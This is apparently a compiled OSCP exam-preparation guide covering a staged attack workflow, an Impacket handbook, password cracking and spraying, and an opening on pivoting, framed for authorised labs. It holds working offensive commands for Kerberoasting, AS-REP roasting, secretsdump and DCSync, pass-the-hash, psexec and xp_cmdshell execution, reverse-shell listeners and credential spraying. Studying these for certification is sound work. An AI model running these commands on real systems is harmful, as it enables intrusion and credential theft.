  • Stage your tools before the start: ligolo-ng proxy + agents (Linux / Windows), chisel, linpeas.sh, winPEASx64.exe, pspy64, PrintSpoofer64.exe, GodPotato-NET4.exe, SharpHound.exe, Rubeus.exe, mimikatz.exe, nc.exe — in one folder you can serve with python3 -m http.server.

docs.title: Stage 1 — Recon
docs.text:
Run the full TCP sweep on every target in the background while you start on the first ports.

sudo nmap -p- --min-rate 2000 -Pn -oN nmap/all.txt $IP
ports=$(grep -oP '^\d+(?=/tcp\s+open)' nmap/all.txt | paste -sd,)
sudo nmap -sC -sV -Pn -p$ports -oN nmap/svc.txt $IP
sudo nmap -sU --top-ports 25 -Pn -oN nmap/udp.txt $IP

Read: versions, hostnames in certificates / SMB banners (→ /etc/hosts), anonymous access flags in NSE output. Next: one investigation per port → Recon & enumeration.

docs.title: Stage 2 — Initial access
docs.text:
Work cheapest first: anonymous / default creds → known-vulnerable version (searchsploit) → web content discovery → app logic (SQLi, LFI, upload) → brute force only with a real username and a reason.

Done when: you have command execution — even a web shell. Next: turn it into a real reverse shell (stage 3). Detail → Web & initial access.

Exam rule

No sqlmap, no Nessus / OpenVAS / nuclei-style mass scanning, no Burp Pro. Manual SQLi with Burp Community Repeater instead → Manual SQLi.

docs.title: Stage 3 — Stabilise the shell
docs.text:
rlwrap -cAr nc -lvnp 443                           # listener (Windows shells)
python3 -c 'import pty; pty.spawn("/bin/bash")'   # Linux: then Ctrl-Z
stty raw -echo; fg; export TERM=xterm

Done when: arrow keys work, Ctrl-C doesn't kill the shell, and you can pull files from Kali. Screenshot local.txt from this interactive shell, with ip addr / ipconfig in the same shot. Detail → Shells & file transfer.

docs.title: Stage 4 — Privilege escalation
docs.text:
LinuxWindows

sudo -l → SUID / capabilities → cron (pspy64) → credentials in files → LinPEAS → kernel last. Detail → Linux privesc.

whoami /priv (SeImpersonate → potato) → WinPEAS → services / tasks → stored creds → AlwaysInstallElevated. Detail → Windows privesc.

Done when: proof.txt is shown with whoami and the IP in one screenshot.

docs.title: Stage 5 — AD set: assumed breach
docs.text:
You get a domain user. In order:

echo "$DC dc01.$DOMAIN dc01 $DOMAIN" | sudo tee -a /etc/hosts
nxc smb 10.10.120.0/24 -u "$USER_" -p "$PASS"                 # where does it work?
nxc winrm 10.10.120.0/24 -u "$USER_" -p "$PASS"
nxc smb $DC -u "$USER_" -p "$PASS" --pass-pol --users --shares
bloodhound-ce-python -u "$USER_" -p "$PASS" -d $DOMAIN -ns $DC -c All --zip
impacket-GetUserSPNs "$DOMAIN/$USER_:$PASS" -dc-ip $DC -request -outputfile kerb.hash
impacket-GetNPUsers "$DOMAIN/$USER_:$PASS" -dc-ip $DC -request -outputfile asrep.hash

The external host

In most sets the first machine (MS01) is the only one reachable from Kali; the internal hosts sit behind it. The assumed-breach user often logs in to MS01 only — so the first job is usually local privesc on MS01, then loot, then pivot.

Read: Pwn3d! in NetExec output (= local admin), lockout threshold, kerberoastable / AS-REP users, outbound ACLs in BloodHound. Next: crack → Password attacks, then try every new credential everywhere. Detail → Active Directory.

Exam rule

No Responder / mitm6 / ARP poisoning (spoofing). To get a NetNTLMv2 hash, make the target connect to your SMB server instead → Coercion without spoofing.

docs.title: Stage 6 — Pivot
docs.text:
As soon as MS01 shows a second NIC (ipconfig /all), run a ligolo-ng agent there and route the internal subnet:

ligolo-ng » session
ligolo-ng » interface_add_route --name ligolo --route 10.10.120.0/24
ligolo-ng » tunnel_start --tun ligolo

Done when: nxc smb 10.10.120.0/24 from Kali lists the internal hosts. Detail → Pivoting.

docs.title: Stage 7 — Lateral movement
docs.text:
Loot MS01 first (secretsdump, mimikatz, PowerShell history, files) → spray the new hashes / passwords across the internal subnet:

nxc smb 10.10.120.0/24 -u administrator -H <NT> --local-auth
nxc winrm 10.10.120.0/24 -u svc_sql -p 'Found_Pass1' 
evil-winrm -i 10.10.120.141 -u svc_sql -p 'Found_Pass1'

Detail → Active Directory › Lateral movement.

docs.title: Stage 8 — Domain compromise
docs.text:
With a Domain Admin credential or a user that has replication rights:

impacket-secretsdump "$DOMAIN/da_user:Pass@dc01.$DOMAIN" -just-dc-user Administrator
impacket-psexec -hashes :<NT> "$DOMAIN/Administrator@dc01.$DOMAIN"

Screenshot proof.txt on the DC with whoami and ipconfig. Detail → Active Directory › Domain compromise.

docs.title: Time budget
docs.text:
Block Suggested budget If it stalls Warm-up standalone 2–3 h Note it, move to AD AD set 6–8 h After ~2 h with no new information, switch to a standalone Remaining standalones Rest Rotate every 60–90 min Report material check 1 h before the end Re-take any missing screenshot while shells are alive

See Exam-day strategy and Exam format › Scoring strategy.

docs.title: Impacket Practical Handbook
docs.text:
Updated / 최종 수정: 2026-11-05

What mastering Impacket means

Pick the correct protocol and identity, understand the rights it requires, read the result, then choose the next step. A successful login is not administrative access. An NT hash is not a NetNTLM challenge-response. A ticket is not a password.

This is the working companion to Active Directory and the practical guide. The sequence is shares → users/SPNs → credential material → authenticated access → host secrets or replication only when the required rights exist.

Screens and verification

Images render real captured command output from Impacket 0.13.1 in a Linux container, using its upstream .py executable names. Help panels show actual -h output, sometimes cropped to relevant lines; they do not show a successful AD attack. Only the loopback SMB lab was executed against a service. Windows/AD commands below are documented lab procedures, not claimed exam results. See reproduce the captures.

Before an exam

Use these procedures in your own or authorised labs. Recheck the official Exam Guide and tool restrictions. Impacket is not a blanket approval for every script or feature; this chapter omits relay, poisoning and automatic attack chains. Study this before the exam; AI assistance is prohibited during the exam.

docs.title: 1. Install once; verify executable names
docs.text:
On Kali, use its package manager. Upstream pipx installations commonly expose GetUserSPNs.py, while Kali exposes impacket-GetUserSPNs. Capitalisation matters. Do not mix a development checkout with distribution libraries during timed practice.

sudo apt update
sudo apt install impacket-scripts python3-impacket
command -v impacket-GetUserSPNs impacket-secretsdump
impacket-GetUserSPNs -h
python3 -c 'from importlib.metadata import version; print(version("impacket"))'
# Alternative isolated upstream installation, not alongside a broken system install:
# pipx install 'impacket==0.13.1'
# GetUserSPNs.py -h

Record the version in your notes. The examples below use Kali names; replace the prefix with the corresponding .py script if using pipx. A ModuleNotFoundError is an installation/interpreter problem, not a target vulnerability.

docs.title: 2. Identity grammar and authentication choices
docs.text:
Use this fictional lab consistently. Replace addresses with your assigned lab hosts. Commands without a password prompt for it. This avoids delimiters such as @, : or shell-special characters being misparsed in a password embedded in a target string.

export LAB_DOMAIN=training.test
export LAB_DC=10.10.20.10
export LAB_DC_FQDN=dc01.training.test
export LAB_HOST=10.10.20.21
export LAB_HOST_FQDN=ms01.training.test
export LAB_USER=learner
mkdir -p ~/oscp-lab/{notes,loot,screens}
cd ~/oscp-lab
getent hosts "$LAB_DC_FQDN" "$LAB_HOST_FQDN"
# Normal identity: DOMAIN/user@target  (password will be requested)
impacket-smbclient "$LAB_DOMAIN/$LAB_USER@$LAB_HOST"
# A discovered NT hash, NOT a NetNTLMv2 response:
# impacket-wmiexec -hashes ":$LAB_NT" "$LAB_DOMAIN/adminuser@$LAB_HOST"
# Existing Kerberos ccache, target must match the service hostname:
# KRB5CCNAME="$PWD/learner.ccache" impacket-smbclient -k -no-pass #   -dc-ip "$LAB_DC" "$LAB_DOMAIN/$LAB_USER@$LAB_HOST_FQDN"
Material Meaning / correct use Password DOMAIN/user@host, then enter the password; SQL authentication may omit domain NT hash -hashes LMHASH:NTHASH; use :NTHASH when no LM hash is needed; 32 hex characters for NT NetNTLMv2 response Captured challenge-response, crack with the appropriate format; not accepted directly as -hashes TGT / service ticket .ccache selected through KRB5CCNAME; -k -no-pass requests Kerberos without a password prompt -dc-ip The DC/KDC address; it does not redirect every service connection to the DC -target-ip Where the tool connects while retaining a hostname for authentication, where supported

Local account example: MS01/Administrator@10.10.20.21. Domain account example: training.test/Administrator@10.10.20.21. These may be different accounts with different passwords. Check route, DNS and clock before debugging Kerberos.

docs.title: 3. Choose the tool
docs.text:
Situation Tool Prerequisite / output Read shares / move files smbclient, smbserver Share permissions / directory listing or transferred file Enumerate domain users GetADUsers, lookupsid LDAP or permitted SAM/LSA RPC access / account names Discover SPNs and request roast material GetUserSPNs Valid domain authentication, KDC reachability / TGS hash Request AS-REP for a known account GetNPUsers Account with pre-authentication disabled / AS-REP hash Query MSSQL; inspect SQL rights mssqlclient SQL login or Windows login accepted by SQL Server Execute as a privileged account wmiexec, psexec, smbexec Appropriate remote administration rights, ports and shares Parse SAM; retrieve host secrets; DCSync secretsdump Different privileges for each mode; see section 11 Obtain/use Kerberos tickets getTGT, getST, ticketConverter Valid key/password/ticket; delegation rights if impersonating

No row is a universal bypass. If the required right is absent, find a different path.

docs.title: 4. smbclient — read before executing
docs.text:
Use when: port 445 is reachable and you have credentials or a permitted anonymous session. It is a file/share client, not a Windows command shell. Check useful shares before attempting administrative execution.

impacket-smbclient "$LAB_DOMAIN/$LAB_USER@$LAB_HOST"
# Inside the SMB mini-shell:
# shares
# use IT
# ls
# cd Backups
# get app.config
# exit

Read: a listed share is not proof of read permission. use plus ls establishes actual access. get writes to your local working directory. Inspect an authorised lab config for usernames, connection strings and service names, then validate the credential on its intended service. STATUS_ACCESS_DENIED on C$ is compatible with a valid low-privilege login. A flag read with SMB cat is not exam proof; obtain an interactive target shell.

docs.title: 5. smbserver — controlled file transfer
docs.text:
Use when: the Windows lab host must fetch a tool from your attacker VM. Serve a dedicated staging directory, not your whole home folder. Standard Windows UNC paths use port 445, so the normal transfer server needs permission to bind that port.

mkdir -p ~/oscp-lab/stage
# Copy only the intended lab file into stage first.
sudo impacket-smbserver STAGE ~/oscp-lab/stage -smb2support   -username labshare -password 'LabOnly-123!'
# On the Windows target, replace 10.10.14.5 with your reachable Kali address:
# net use \\10.10.14.5\STAGE /user:labshare LabOnly-123!
# copy \\10.10.14.5\STAGE\tool.exe C:\Windows\Temp\tool.exe
# net use \\10.10.14.5\STAGE /delete

STAGE is the share name; the next argument is the local directory. -smb2support enables SMB2. Authentication in the server log proves a connection, not that the copy completed: compare file size and SHA-256 on both ends. Modern Windows may refuse guest SMB; an explicit lab account avoids relying on guest policy. For a no-admin localhost drill, use the Impacket API mini-shell on port 1445 in the local lab. In 0.13.1, the smbclient CLI accepts only 139/445; -port 1445 is rejected. Native UNC copy cannot simply append :1445. Stop the server when finished.

docs.title: 6. GetADUsers and lookupsid — discover identities
docs.text:
Use when: you need account names and domain context. GetADUsers queries LDAP with an authenticated domain account. lookupsid performs SID/RID lookups through RPC over SMB; access may be denied by policy. Enumerating names is not password spraying.

impacket-GetADUsers "$LAB_DOMAIN/$LAB_USER" -dc-ip "$LAB_DC" -all
impacket-lookupsid "$LAB_DOMAIN/$LAB_USER@$LAB_DC" 2000

-all widens the LDAP account listing; 2000 is the lookup upper RID bound, not a port. Record the domain SID, SidTypeUser names and account status if available. Do not treat every returned group/computer as a human login. Next: choose a known account or SPN to investigate; avoid repeatedly testing guessed passwords.

docs.title: 7. GetUserSPNs — enumerate first, request second
docs.text:
Prerequisites: a valid domain account, name resolution, LDAP/KDC reachability and a service account with an SPN. An SPN is a service name such as MSSQLSvc/ms01.training.test:1433. Its existence does not guarantee a weak password.

# List SPNs and account names first:
impacket-GetUserSPNs "$LAB_DOMAIN/$LAB_USER" -dc-ip "$LAB_DC"
# Then request TGS material for a known lab service account:
impacket-GetUserSPNs "$LAB_DOMAIN/$LAB_USER" -dc-ip "$LAB_DC"   -request-user svc_sql -outputfile loot/kerberoast.txt
# Only if output starts with $krb5tgs$23$ (RC4):
# hashcat -m 13100 loot/kerberoast.txt /usr/share/wordlists/rockyou.txt

Read: SPN → account mapping, then the hash prefix and encryption type. -request-user narrows the request; -outputfile saves crackable material, not a plaintext password. $krb5tgs$18$ needs a different hashcat mode (19700), not 13100. Use a short, relevant wordlist first, then validate any recovered password against the named account. Empty output can mean no eligible SPNs, wrong domain, LDAP failure or unsupported encryption; it does not prove there is no AD path.

docs.title: 8. GetNPUsers — the pre-authentication exception
docs.text:
Prerequisites: a known username whose account does not require Kerberos pre-authentication. No password is needed for that specific request; most normal accounts will not be eligible. A username list must be one username per line, not a dump of formatted tool output.

impacket-GetNPUsers "$LAB_DOMAIN/svc_legacy" -dc-ip "$LAB_DC"   -no-pass -format hashcat -outputfile loot/asrep.txt
# For a small known lab-user list:
# impacket-GetNPUsers "$LAB_DOMAIN/" -dc-ip "$LAB_DC" #   -usersfile notes/users.txt -no-pass -format hashcat -outputfile loot/asrep.txt
# For $krb5asrep$23$ output:
# hashcat -m 18200 loot/asrep.txt /usr/share/wordlists/rockyou.txt

UF_DONT_REQUIRE_PREAUTH absent means this path does not apply to that account. KDC_ERR_C_PRINCIPAL_UNKNOWN means the KDC did not find the principal in that realm. Do not turn either result into a large password-guessing loop. Compare this with Kerberoasting: AS-REP targets user pre-auth settings; TGS roasting targets SPN service accounts.

docs.title: 9. mssqlclient — SQL rights before OS execution
docs.text:
Use when: TCP 1433 or another discovered MSSQL port is reachable. Windows authentication (-windows-auth) and SQL authentication are different. A domain password that works on SMB does not automatically have a SQL login.

impacket-mssqlclient "$LAB_DOMAIN/$LAB_USER@$LAB_HOST" -windows-auth
# SQL-native account instead:
# impacket-mssqlclient "sql_reader@$LAB_HOST" -port 1433
# In the SQL shell:
# SELECT SYSTEM_USER, ORIGINAL_LOGIN(), DB_NAME();
# SELECT IS_SRVROLEMEMBER('sysadmin');
# SELECT name FROM sys.databases;
# help
# Only in a lab where your SQL role permits configuration changes:
# enable_xp_cmdshell
# xp_cmdshell whoami
# disable_xp_cmdshell

IS_SRVROLEMEMBER returns 1 for membership, 0 for non-membership, and can return NULL when the principal/role cannot be resolved. SQL sysadmin and Windows local Administrator are different. xp_cmdshell runs under the SQL service account or a configured proxy, so check whoami; it is not automatically SYSTEM. Record the original configuration and restore it if you changed it. If permissions are absent, inspect allowed databases, configuration and impersonation rights rather than repeatedly enabling a denied feature.

docs.title: 10. wmiexec, psexec and smbexec — choose by prerequisites
docs.text:
All three normally require administrative remote access. They do not escalate a standard domain user merely because the password is valid. Preserve which identity you used and what changed on the host.

# Password is requested; use an account already confirmed to have the needed rights.
impacket-wmiexec "$LAB_DOMAIN/adminuser@$LAB_HOST"
# Alternatives when their prerequisites are met:
# impacket-psexec "$LAB_DOMAIN/adminuser@$LAB_HOST"
# impacket-smbexec "$LAB_DOMAIN/adminuser@$LAB_HOST"
# Hash authentication (set LAB_NT to a discovered 32-hex NT hash first):
# impacket-wmiexec -hashes ":$LAB_NT" "$LAB_DOMAIN/adminuser@$LAB_HOST"
# At the remote command prompt, separately:
# whoami
# hostname
# ipconfig
Tool Mechanism / network needs Common failure and next check wmiexec WMI/DCOM, RPC 135 + dynamic RPC; default output retrieval uses SMB 445 and an admin share RPC timeout → route/firewall; output/share denial → rights and SMB access psexec SMB upload to a writable share and service creation through SCM No writable share or service denied → admin rights, share policy, endpoint controls smbexec Service-based command execution; output behaviour depends on mode SCM denied → privileges; output unavailable → SMB path and chosen mode

The wmiexec and smbexec prompts are semi-interactive: each command may run in a fresh process. Do not assume set, cd or an interactive program behaves like a persistent terminal. Use full paths and verify context. psexec normally creates a service and commonly obtains SYSTEM, but verify whoami rather than assuming it. After use, inspect tool cleanup messages; do not delete arbitrary services.

For exam proof, read the flag in an interactive shell on the target with type/cat, from its original location, with the IP visible. Do not substitute a downloaded flag or a one-shot output file. See proof requirements.

docs.title: 11. secretsdump — three different tasks
docs.text:
A. Offline SAM: SYSTEM and SAM hives from the same Windows installation. B. Remote member host: appropriate remote admin rights; Remote Registry/SMB/service access can matter. C. DCSync: domain replication rights on the DC; local admin on a workstation is not enough.

# A: On the lab Windows host, in an elevated cmd shell:
# reg save HKLM\SAM C:\Windows\Temp\sam.save
# reg save HKLM\SYSTEM C:\Windows\Temp\system.save
# Transfer these lab artifacts to Kali, then:
impacket-secretsdump -sam loot/sam.save -system loot/system.save LOCAL
# B: Remote member-host secrets (requires suitable remote admin access):
# impacket-secretsdump "$LAB_DOMAIN/adminuser@$LAB_HOST" -outputfile loot/ms01
# C: A confirmed replication-capable account, one selected lab user:
# impacket-secretsdump "$LAB_DOMAIN/replicator@$LAB_DC_FQDN" #   -dc-ip "$LAB_DC" -just-dc-user labadmin -outputfile loot/dc-selected

Read: SAM entries are user:RID:LM:NT:::; the NT field is the fourth colon-separated field. A remote dump can also contain cached domain credentials, LSA secrets and Kerberos keys—these are different formats and cannot all be passed as NT hashes. -just-dc-user narrows DRSUAPI extraction; it does not grant replication rights. LOCAL means parse local files, not authenticate as a local account. Pair the SYSTEM hive with the correct SAM; a text .reg export is not a substitute. Protect and remove lab hive copies after the exercise.

docs.title: 12. getTGT, getST and ticketConverter
docs.text:
Start with ordinary ticket use. A TGT authenticates you to the KDC so you can request service tickets. A service ticket is for an SPN such as cifs/ms01.training.test. DNS identity, realm, clock and ticket lifetime all matter. Obtaining a ticket does not add group memberships.

impacket-getTGT "$LAB_DOMAIN/$LAB_USER" -dc-ip "$LAB_DC"
export KRB5CCNAME="$PWD/$LAB_USER.ccache"
impacket-smbclient -k -no-pass -dc-ip "$LAB_DC"   "$LAB_DOMAIN/$LAB_USER@$LAB_HOST_FQDN"
# Request a normal service ticket for the SAME authenticated identity:
# impacket-getST "$LAB_DOMAIN/$LAB_USER" -k -no-pass -dc-ip "$LAB_DC" #   -spn "cifs/$LAB_HOST_FQDN"
# Convert a lab ticket format, without changing its rights:
# impacket-ticketConverter learner.kirbi learner.ccache
# Inspect the output filename and select that exact cache if changing tickets:
# export KRB5CCNAME="$PWD/<actual-output-filename>.ccache"
unset KRB5CCNAME

-k enables Kerberos; -no-pass prevents falling back to a password prompt. A cache contains credentials for its own identity, not whichever username you wish to type. Use an FQDN matching the service/SPN; an IP alone commonly breaks the name association. getST -impersonate is a separate delegation workflow that requires a proven delegation relationship and appropriate account rights. Do not append it to ordinary ticket requests as a generic escalation. ticketConverter changes container format, not identity, validity or permissions.

docs.title: 13. Troubleshoot in this order
docs.text: Symptom First check Then do command not found / import error Kali prefix vs .py; interpreter and version Repair the isolated install; do not change target settings TCP timeout ip route get <IP>, port reachability, pivot session Restore the route/listener; do not keep changing passwords STATUS_LOGON_FAILURE Username, domain vs local account, password quoting, hash format Make one corrected validation attempt; check lockout policy STATUS_ACCESS_DENIED Login may be valid but rights insufficient Confirm share/SCM/WMI/WinRM rights separately KRB_AP_ERR_SKEW VM/DC clock difference Compare time and synchronise the lab VM appropriately KDC_ERR_S_PRINCIPAL_UNKNOWN Target FQDN and SPN, correct realm Resolve the service name; request the correct SPN KDC_ERR_C_PRINCIPAL_UNKNOWN Client username and realm Correct identity; do not assume a password error Empty roast file Eligible account, request flag, LDAP/KDC errors Inspect output; use another evidence-backed path WMI shell starts, no command output SMB 445/admin share access and command path Use full paths; compare another permitted execution method DRSUAPI denied Replication rights and DC target Return to the proven ACL/credential path; no flag can grant the right

docs.title: 14. Mastery drills
docs.text:
• Explain the target grammar without looking at a command.
  • Read a share, download one file, and compare SHA-256 in the loopback lab.
  • Explain why a NetNTLMv2 response cannot be supplied as -hashes.
  • Enumerate SPNs, request one lab account's TGS and choose the hash mode from its prefix.
  • Distinguish AS-REP eligibility from an invalid username.
  • Query SQL identity/roles before attempting any OS execution.
  • Predict why SMB login can work while psexec fails.
  • Explain workstation SAM versus DCSync, and the right each needs.
  • Use a TGT cache with a matching service hostname; deliberately diagnose one DNS/clock error.
  • Capture target identity, IP, original-location proof and reproducible commands for a mock report.

docs.title: Methodology & Habits
docs.text:
Applies to: every machine · Last updated: 2026-10-23

In one sentence

Most lost points in write-ups come from missed enumeration or time sunk into rabbit holes — not from missing an advanced technique.

How this page is organised

The habits that turn knowledge into points under a clock. Build these during practice so they run on autopilot in the exam.

docs.title: The per-machine loop
docs.text:
flowchart LR
    S[Scan all ports] --> E[Enumerate each service]
    E --> F[Foothold: simple ideas first]
    F --> L[Local enumeration]
    L --> P[Privilege escalation]
    P --> D[Document as you go]

docs.title: Enumeration checklist
docs.text:
• All ports, both protocols. Full TCP (-p-), then service/version on what's open. Don't forget a UDP scan of common ports — SNMP and others hide there.
  • Read all the output. The intended path is usually visible; the skill is noticing it, not finding something hidden.
  • Enumerate the boring things too. A generic-looking service or an empty-looking share is often the way in.

docs.title: Simple things first
docs.text:
Before any exploit chain, try the cheap ideas:

  • Default credentials (admin:admin, product defaults), the username as the password, anonymous / blank logins.
  • Password reuse — a credential from one box or user tried everywhere.
  • "Nmap doesn't lie" — if a port is open, something is listening; find out what before assuming it's a dead end.

docs.title: Don't wait on scans
docs.text: Long scans run in the background while you work. Found a WordPress plugin? Research it now; don't wait for the scan to finish. Keep two or three threads of investigation going at once.

docs.title: Rabbit holes
docs.text:
• Time-box. Give a lead a fixed budget (say 30–45 min). If it hasn't moved, note it and switch targets — come back with fresh eyes.
  • Not every hard thing is the path. OffSec deliberately includes distractions. Good enumeration is also about ruling things out.
  • Backtracking is exhausting — enumerate fully the first time so you don't have to redo a box at hour 15.

docs.title: Metasploit budget
docs.text: One target only, locked in once used (exam rule). Spend it where it helps most — many people save it for a privilege-escalation suggestion on a single stubborn box rather than an initial foothold. msfvenom and multi/handler are allowed everywhere.

docs.title: Notes and a personal cheat sheet
docs.text:
• One page per machine, same structure every time: scan → enumeration → initial access → local enumeration → privilege escalation → flags. This is your report draft — see Reporting.
  • Screenshot as you go, including the proof requirements, so you're not re-hacking a box to get a missing screenshot.
  • Build a cheat sheet from your own mistakes, not generic tips — the command you forgot, the step you skipped. That is the one resource no course gives you.

docs.title: Workflow setup
docs.text:
• Variables for target IP, your IP and the domain, so pivoting to a new box is one edit.
  • A tidy folder per target; one terminal multiplexer (tmux) tab per machine.
  • Your scripts, wordlists and payloads in known places before the exam starts.

docs.title: Mindset
docs.text:
• Feeling underprepared the night before is normal. If you've done the work, that feeling is a liar.
  • Action kills anxiety — once the first scan is running, muscle memory takes over.
  • Take real breaks and eat lightly. Burnout is a documented exam factor, not an excuse. Most breakthroughs come after stepping away.

docs.title: Password Attacks
docs.text:
Applies to: standalones and the AD set · Priority: High · Last updated: 2026-11-03

In one sentence

Identify the hash, pick the right cracking mode, crack offline with hashcat / john — and spray online carefully, because one lockout can cost you the AD set.

Practical companion

For command selection, output interpretation and failure diagnosis, use the practical field guide; for Windows/AD protocol detail, use the Impacket handbook.

docs.title: 1. Concept
docs.text:
Attack Where Risk Tool Offline cracking Hashes you've dumped / roasted / captured None to the target hashcat, john Password spraying One password × many users Account lockout NetExec, Kerbrute Brute force Many passwords × one user Lockout, slow, noisy hydra, NetExec Reuse / pass-the-hash A found credential on every service Low NetExec, evil-winrm, Impacket

Order of preference on the exam: reuse first, crack offline second, spray third, brute force last.

docs.title: 2. Main tools
docs.text: Tool Use it for Exam status hashcat GPU/CPU offline cracking, rules Allowed john + *2john scripts Cracking file formats (ZIP, SSH key, KeePass, PDF), quick runs Allowed hydra Online brute force: SSH, FTP, HTTP forms, RDP, … Allowed NetExec Spraying SMB / WinRM / LDAP / MSSQL / RDP, hash reuse Allowed Kerbrute Kerberos user enumeration and spraying Allowed hashid / hashcat --identify What kind of hash is this? Allowed

docs.title: 3.1 Identify the hash
docs.text:
hashcat --identify hash.txt
hashid -m 'HASH_HERE'
Hash Looks like hashcat -m john --format MD5 32 hex 0 raw-md5 SHA1 40 hex 100 raw-sha1 SHA-256 64 hex 1400 raw-sha256 md5crypt $1$... 500 md5crypt sha512crypt (/etc/shadow) $6$... 1800 sha512crypt bcrypt $2y$ / $2a$ 3200 bcrypt NTLM 32 hex (from SAM / secretsdump) 1000 nt NetNTLMv2 user::DOMAIN:challenge:... 5600 netntlmv2 Kerberoast RC4 / AES256 $krb5tgs$23$ / $krb5tgs$18$ 13100 / 19700 krb5tgs AS-REP $krb5asrep$23$ 18200 krb5asrep DCC2 (cached domain logon) $DCC2$10240#user#... 2100 mscash2 KeePass keepass2john output 13400 KeePass

docs.title: 3.2 hashcat — offline cracking
docs.text:
Situation: You have kerb.hash from GetUserSPNs, or NTLM hashes from secretsdump.

hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 kerb.hash --show                 # already cracked?
hashcat -m 1000 ntlm.txt rockyou.txt --username   # input lines "user:hash"

What to read: Status...........: Cracked and the hash:password line; Exhausted → try a rule, a custom wordlist, or accept it's not meant to crack.

Next: test the password everywhere (3.5). An uncrackable NTLM hash is still usable — pass it instead.

In a VM without a GPU

hashcat on CPU is slow for -m 1800 (sha512crypt) and -m 3200 (bcrypt). The intended OSCP passwords are almost always in rockyou.txt; if a slow hash doesn't fall in ~10 minutes, look for another path rather than waiting hours.

docs.title: 3.3 john — files and formats
docs.text:
Situation: A protected file: backup.zip, id_rsa with a passphrase, Database.kdbx, a PDF.

zip2john backup.zip > zip.hash
ssh2john id_rsa > ssh.hash
keepass2john Database.kdbx > kp.hash
pdf2john file.pdf > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt kp.hash
john --show kp.hash

Next: KeePass → open with kpcli or KeePassXC and read every entry (they usually hold the next credential); SSH key → ssh -i id_rsa user@$IP.

/etc/shadow + /etc/passwd: unshadow passwd shadow > unsh.txt; john --wordlist=rockyou.txt unsh.txt.

docs.title: 3.4 Custom wordlists
docs.text:
Situation: rockyou.txt failed, but the target has a theme (company name, product, season).

cewl http://$IP -d 2 -m 5 -w loot/cewl.txt                     # words from the website
hashcat --stdout loot/cewl.txt -r /usr/share/hashcat/rules/best64.rule > loot/mutated.txt
printf 'Spring2026!
Summer2026!
Autumn2026!
Fall2026!
Winter2026!
Company123!
' > loot/seasons.txt

docs.title: 3.5 Credential reuse and spraying — NetExec
docs.text:
Situation: You cracked one password, or the AD set gave you one, and you have a user list.

# ALWAYS read the policy first
nxc smb $DC -u "$USER_" -p "$PASS" --pass-pol

# one password, all users (domain)
nxc smb $DC -u users.txt -p 'Spring2026!' --continue-on-success
# one credential, all hosts and protocols
nxc smb 10.10.120.0/24 -u svc_web -p 'Found_Pass1'
nxc winrm 10.10.120.0/24 -u svc_web -p 'Found_Pass1'
nxc mssql 10.10.120.0/24 -u svc_web -p 'Found_Pass1'
nxc rdp 10.10.120.0/24 -u svc_web -p 'Found_Pass1'
# local accounts (same local admin password on many hosts)
nxc smb 10.10.120.0/24 -u administrator -H <NT> --local-auth
# username = password
nxc smb $DC -u users.txt -p users.txt --no-bruteforce --continue-on-success

What to read:

  • [+] CORP\svc_web:Found_Pass1 → valid.
  • (Pwn3d!) → local admin → secretsdump / psexec / wmiexec on that host.
  • STATUS_PASSWORD_EXPIRED / STATUS_ACCOUNT_RESTRICTION → valid password but a restriction (try other protocols, or smbpasswd -r to change an expired one).
  • STATUS_ACCOUNT_LOCKED_OUT → stop spraying.

Lockout math

Account Lockout Threshold: 5 and an observation window of 30 min → at most 4 attempts per user per 30 minutes, including attempts you've already made. Threshold: 0 / None → no lockout. When in doubt, spray one password, wait, then the next.

docs.title: 3.6 Kerbrute — users and spraying over Kerberos
docs.text:
Situation: You have the DC but no valid user yet (or want to validate a name list quickly).

kerbrute userenum -d $DOMAIN --dc $DC /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o loot/kb-users.txt
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Spring2026!'

What to read: VALID USERNAME: jdoe@corp.local; Kerbrute also flags users without pre-auth (→ AS-REP roast). Kerberos pre-auth failures do count toward lockout — same lockout math applies.

docs.title: 3.7 hydra — online brute force
docs.text:
Situation: A login with a known username and no lockout (SSH, FTP, a web form), and nothing better left.

hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://$IP
hydra -L users.txt -P passwords.txt ftp://$IP
# HTTP POST form — copy the field names and failure string from Burp
hydra -l admin -P rockyou.txt $IP http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials" -t 16
# HTTP basic auth
hydra -l admin -P rockyou.txt $IP http-get /admin/

What to read: [22][ssh] host: ... login: admin password: .... Many false positives? Your failure string F= is wrong — check the response in Burp.

Brute force is allowed, but

It is slow and almost never the intended path on OSCP. Limit runs to a confirmed user and a sensible list (top few thousand), and keep it in the background while you enumerate.

docs.title: 4. Common mistakes
docs.text:
• Spraying before reading the password policy — locking out the given AD user can end the set.
  • Wrong hashcat mode (13100 vs 19700, 5600 vs 5500) → "Token length exception".
  • Leaving the user: prefix in the hash file without --username.
  • Forgetting hashes are credentials. NTLM never needs cracking for SMB / WinRM — pass it.
  • Not trying cracked passwords for other users (password reuse across accounts is a staple).
  • Brute forcing SSH with rockyou instead of enumerating.

docs.title: 5. Exam tips
docs.text:
• Keep creds.txt as user:password:source and hashes.txt as user:hash:source; re-spray the whole list every time it grows.
  • Run hashcat in its own tmux pane and keep working.
  • Report: note how each credential was obtained (file, hash type, wordlist) — it's part of reproducibility.

docs.title: Pivoting & Tunnelling
docs.text:
Where it matters: AD set — reaching internal subnets · Priority: High · Last updated: 2026-11-03

In one sentence

The failure that shows up most in 2025–2026 write-ups: owning the first machine but never getting traffic into the internal network behind it. Pivoting is the fix — make the compromised host carry your tools' traffic onward.

Practical companion

For command selection, output interpretation and failure diagnosis, use the practical field guide; for Windows/AD protocol detail, use the Impacket handbook.

docs.title: When you need to pivot
docs.text:
Signs that there is a network you can't reach yet:

  • ipconfig /all or ip addr on the foothold shows a second interface on a different subnet.
  • A host has services bound to 127.0.0.1 only.
  • BloodHound / enumeration names machines you cannot ping or scan from Kali.

The shape of the problem: Kali can talk to the foothold, the foothold can talk to the internal hosts, but Kali cannot talk to the internal hosts directly. You route through the foothold.

flowchart LR
    K[Kali<br/>attacker] <--> P[Foothold / MS01<br/>dual-homed]
    P <--> I1[Internal host<br/>MS02]
    P <--> I2[Internal host<br/>DC01]
    K -. cannot reach directly .-> I1

